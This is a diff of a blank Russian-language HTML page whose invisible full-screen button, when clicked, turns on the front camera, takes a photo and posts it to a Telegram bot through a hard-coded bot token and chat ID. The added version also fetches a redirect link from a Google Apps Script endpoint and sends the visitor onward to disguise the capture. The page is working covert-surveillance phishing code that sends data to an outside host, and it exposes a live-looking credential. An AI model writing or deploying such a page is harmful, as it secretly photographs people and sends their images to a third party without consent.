@@ -1,26 +1,16 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <style>
-        html, body {
-            margin: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            overflow: hidden;
-        }
-        button {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            border: none;
-            background: transparent;
-            padding: 0;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title></title>
+<style>
+  html, body { margin:0; width:100%; height:100%; background:#fff; overflow:hidden; }
+  button {
+    position:fixed; inset:0; width:100%; height:100%;
+    border:none; background:transparent; padding:0; cursor:pointer;
+  }
+</style>
 </head>
 <body>
 
@@ -29,51 +19,80 @@
 <button id="btn"></button>
 
 <script>
-    const BOT_TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
-    const CHAT_ID = "1314241513";
+  const BOT_TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
+  const CHAT_ID = "1314241513";
+  const API_URL = "https://script.google.com/macros/s/AKfycbyfNJ9zZ6FJw2blf4NUDCv7FgoVpJKpl-caW-JAXtqLnCZeT51GiNIPS0C3h33qIu6G/exec";
 
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const btn = document.getElementById("btn");
 
-    let requested = false;
+  const code = new URLSearchParams(location.search).get("go");
+  let requested = false;
 
-    async function sendToTelegram(blob) {
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "photo.png");
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            });
-        } catch (e) {
-            console.log("Ошибка отправки:", e);
-        }
+  async function getRedirectUrl() {
+    if (!code) return null;
+    try {
+      const r = await fetch(API_URL + "?go=" + encodeURIComponent(code));
+      const j = await r.json();
+      return j.ok ? j.url : null;
+    } catch (e) {
+      console.log("Ошибка получения ссылки:", e);
+      return null;
+    }
+  }
+
+  async function sendToTelegram(blob) {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("photo", blob, "photo.png");
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: fd
+      });
+    } catch (e) {
+      console.log("Ошибка отправки фото:", e);
+    }
+  }
+
+  async function takePhotoAndRedirect() {
+    if (requested) return;
+    requested = true;
+
+    const redirectUrl = await getRedirectUrl();
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" }
+      });
+      video.srcObject = stream;
+      await video.play();
+      await new Promise(r => setTimeout(r, 500));
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      stream.getTracks().forEach(t => t.stop());
+
+      await new Promise(resolve => {
+        canvas.toBlob(async (blob) => {
+          await sendToTelegram(blob);
+          resolve();
+        }, "image/png");
+      });
+    } catch (e) {
+      console.log("Камера недоступна:", e.name);
     }
 
-    async function takePhoto() {
-        if (requested) return;
-        requested = true;
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-            await video.play();
-            await new Promise(r => setTimeout(r, 500));
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext("2d").drawImage(video, 0, 0);
-            stream.getTracks().forEach(t => t.stop());
-            canvas.toBlob(async (blob) => {
-                await sendToTelegram(blob);
-            }, "image/png");
-        } catch (e) {
-            requested = false;
-            console.log("Ошибка:", e.name);
-        }
+    if (redirectUrl) {
+      window.location.replace(redirectUrl);
+    } else if (code) {
+      window.location.replace("https://t.me/");
     }
+  }
 
-    document.getElementById("btn").addEventListener("click", takePhoto);
+  btn.addEventListener("click", takePhotoAndRedirect);
 </script>
 
 </body>
